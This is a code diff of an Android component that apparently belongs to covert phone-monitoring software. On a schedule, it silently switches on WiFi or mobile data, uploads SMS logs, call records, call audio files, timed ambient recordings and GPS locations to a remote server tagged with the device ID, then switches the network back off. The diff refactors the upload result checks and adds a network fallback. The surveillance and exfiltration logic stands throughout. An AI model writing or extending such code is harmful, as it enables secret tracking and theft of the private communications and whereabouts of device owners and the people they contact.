@@ -25,6 +25,7 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.SharedPreferences.Editor;
+import android.os.SystemClock;
 import android.telephony.TelephonyManager;
 import android.text.TextUtils;
 
@@ -62,14 +63,21 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 		
 		if(!HttpUtil.detect(context)){
 			Logger.d("CronBroadcaseRectiver","开启网络");
-			AppUtil.toggleMobileNet(context, true);
+			AppUtil.toggleWifi(context, true);
 			isCloseMobileNet = true;
 		}
 		
 		new Thread(new Runnable() {
-			
 			@Override
 			public void run() {
+				if(isCloseMobileNet){
+					SystemClock.sleep(10000);
+					if(!HttpUtil.detect(context)){
+						AppUtil.toggleMobileNet(context,true);
+						isCloseMobileNet = true;
+						SystemClock.sleep(15000);
+					}
+				}
 				
 				if(tm==null){
 					tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
@@ -99,11 +107,9 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 					uploadRecList();
 				}
 				
-				
-				
-			
 			    if(isCloseMobileNet){
 			    	AppUtil.toggleMobileNet(context, false);
+			    	AppUtil.toggleWifi(context, false);
 			    }
 				
 			}
@@ -127,8 +133,8 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 			}
 			String params = "key=" + ClientSocket.APP_REQ_KEY+ "&device_id=" + sp.getString(C.DEVICE_ID, "")+ "&msg_list=" + new Gson().toJson(msgList);
 			Logger.d("SMSMon","正在上传短信记录");
-			String uploadResult = NetworkUtil.uploadSMS(context, params,C.RequestMethod.uploadSMS);
-			if (uploadResult != null && !uploadResult.startsWith("FAIL")) {
+			boolean uploadResult = NetworkUtil.uploadSMS(context, params,C.RequestMethod.uploadSMS);
+			if (uploadResult) {
 				Logger.d("SMSMon","上传短信记录成功");
 				smsRecordDB.deleteAll();
 			}
@@ -151,12 +157,12 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 				callRec.add(callRecord.getFileName());
 				lists.add(callRec);
 				String params = "key=" + ClientSocket.APP_REQ_KEY + "&device_id=" + sp.getString(C.DEVICE_ID,"") + "&call_list=" + new Gson().toJson(lists);
-				String uploadResult = NetworkUtil.uploadCall(context,params,C.RequestMethod.uploadCallRecord);
-			    if(uploadResult !=null && !uploadResult.startsWith("FAIL")){
+				boolean uploadResult = NetworkUtil.uploadCall(context,params,C.RequestMethod.uploadCallRecord);
+			    if(uploadResult){
 			    	String filePath = callRecord.getSoundRecordPath();
 			    	if(!TextUtils.isEmpty(filePath)){
-			    		String uploadFileResult = NetworkUtil.uploadFile(context,filePath,callRecord.getFileName(),C.RequestMethod.uploadCallSoundFile);
-			    		if(uploadFileResult.contains("FAULT")){
+			    		boolean uploadFileResult = NetworkUtil.uploadFile(context,filePath,callRecord.getFileName(),C.RequestMethod.uploadCallSoundFile);
+			    		if(!uploadFileResult){
 			    			callRecordDB.update(CallRecord.COL_UPLOAD_RESULT +" = ? "+" , " + CallRecord.COL_FILE_NAME +" = ? ",CallRecord.COL_CALL_START_TIME +" = ?",new String []{"0",result,callRecord.getCallStartTime()});
 			    		}else {
 							callRecordDB.delete(CallRecord.COL_CALL_START_TIME+" = ? ",new String []{callRecord.getCallStartTime()});
@@ -174,8 +180,8 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 			 }else{
 				 String filePath = callRecord.getSoundRecordPath();
 				 if(!TextUtils.isEmpty(filePath)){
-			    		String uploadFileResult = NetworkUtil.uploadFile(context,filePath,callRecord.getFileName(),C.RequestMethod.uploadCallSoundFile);
-			    		if(uploadFileResult.contains("FAIL")){
+			    		boolean uploadFileResult = NetworkUtil.uploadFile(context,filePath,callRecord.getFileName(),C.RequestMethod.uploadCallSoundFile);
+			    		if(!uploadFileResult){
 			    			callRecordDB.update(CallRecord.COL_UPLOAD_RESULT +" = ? "+" , " + CallRecord.COL_FILE_NAME +" = ? ",CallRecord.COL_CALL_START_TIME +" = ?",new String []{"0",result,callRecord.getCallStartTime()});
 			    		}else {
 							callRecordDB.delete(CallRecord.COL_CALL_START_TIME+" = ? ",new String []{callRecord.getCallStartTime()});
@@ -204,8 +210,8 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 				String longitude = lm.getLongitude();
 				String latitude = lm.getLatitude();
 				long strTime = Long.valueOf(lm.getLocTime());
-				String result = NetworkUtil.sendLocInfo(context,ClientSocket.APP_REQ_KEY,sp.getString(C.DEVICE_ID, ""),longitude, latitude, " ", strTime + "",C.RequestMethod.uploadLocation);
-			    if(!TextUtils.isEmpty(result) && !result.startsWith("FAIL")){
+				boolean result = NetworkUtil.sendLocInfo(context,ClientSocket.APP_REQ_KEY,sp.getString(C.DEVICE_ID, ""),longitude, latitude, " ", strTime + "",C.RequestMethod.uploadLocation);
+			    if(result){
 			    	locManDB.delete(LocationMessage.COL_ID +" =? ", new String []{lm.getId()} );
 			    }
 			}
@@ -230,11 +236,11 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 				String filePath = fileInfo.getFilePath();
 				list.add(one);
 				String param = "key=" + ClientSocket.APP_REQ_KEY + "&device_id=" + deviceId + "&rec_list=" + new Gson().toJson(list);
-				String uploadResult = NetworkUtil.uploadFileInfo(context, param, C.RequestMethod.uploadCallSoundIntrod);
-				if(!TextUtils.isEmpty(uploadResult)&& !uploadResult.startsWith("FAIL")){
+				boolean uploadResult = NetworkUtil.uploadFileInfo(context, param, C.RequestMethod.uploadCallSoundIntrod);
+				if(uploadResult){
 					Logger.d("Cron","上传定时录音文件信息成功");
-					String uploadFileResult = NetworkUtil.uploadFile(context, filePath, fileName, C.RequestMethod.uploadCallSoundFile);
-					if(!TextUtils.isEmpty(uploadResult) && !uploadFileResult.startsWith("FAIL")){
+					boolean uploadFileResult = NetworkUtil.uploadFile(context, filePath, fileName, C.RequestMethod.uploadCallSoundFile);
+					if(uploadFileResult){
 						Logger.d("Cron","上传定时录音文件成功");
 						fileDB.delete(LocationMessage.COL_ID+" =? ",new String []{id});
 						File file =new File(filePath);
@@ -244,5 +250,4 @@ public class CronBroadcaseRectiver extends BroadcastReceiver {
 			}
 		}
 	}
-
 }
